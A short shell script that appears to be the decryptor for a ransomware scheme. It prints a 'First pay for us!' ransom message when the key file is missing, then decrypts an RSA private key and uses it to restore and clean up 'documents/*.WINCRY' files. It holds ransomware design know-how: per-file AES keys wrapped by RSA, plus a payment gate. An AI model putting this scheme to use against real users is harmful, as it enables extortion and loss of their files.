#!/bin/sh
set -ue

if [ ! -f device_key-aes.key ]; then
  echo "device_key-aes.key not found. First pay for us!" >&2
  exit 1
fi


aes_key=$(head -c 64 device_key-aes.key)
iv=$(tail -c +65 device_key-aes.key)
openssl enc -aes-256-cbc -d -K $aes_key -iv $iv -in device_key.pk.aes -out device_key.pk

# Decrypt each file.
for filename_enc in documents/*.WINCRY; do
  filename=$(echo $filename_enc | sed -e 's/\.WINCRY$//')

  # Decrypt the file key.
  openssl pkeyutl -decrypt -inkey device_key.pk -in $filename.sky.rsa -out $filename.sky
  skey=$(head -c 64 $filename.sky)
  iv=$(tail -c +65 $filename.sky)

  openssl enc -aes-256-cbc -d -K $skey -iv $iv -in $filename.WINCRY -out $filename
  rm $filename.WINCRY
  rm $filename.sky
  rm $filename.sky.rsa

done

